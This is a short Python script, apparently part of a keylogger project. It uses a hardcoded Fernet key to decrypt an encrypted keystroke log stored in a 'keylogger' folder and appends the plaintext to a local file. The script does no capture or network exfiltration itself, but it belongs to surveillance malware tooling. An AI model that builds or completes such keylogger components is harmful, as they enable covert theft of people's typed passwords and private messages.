import time

from cryptography.fernet import Fernet

key = 't-q7kCwsld-Wyj3b4vnK3p9yEWCKdoVJpnzoB-MA0oI='
encrypted_file_name = 'C:\\Users\\Kodi_\\Documents\\keylogger\\e_key_log.txt'

try:
    with open(encrypted_file_name, 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    decrypted = fernet.decrypt(data)

    with open('decryption.txt', 'ab') as f:
        f.write(decrypted)

except Exception as e:
    print(f"Error during decryption: {e}")

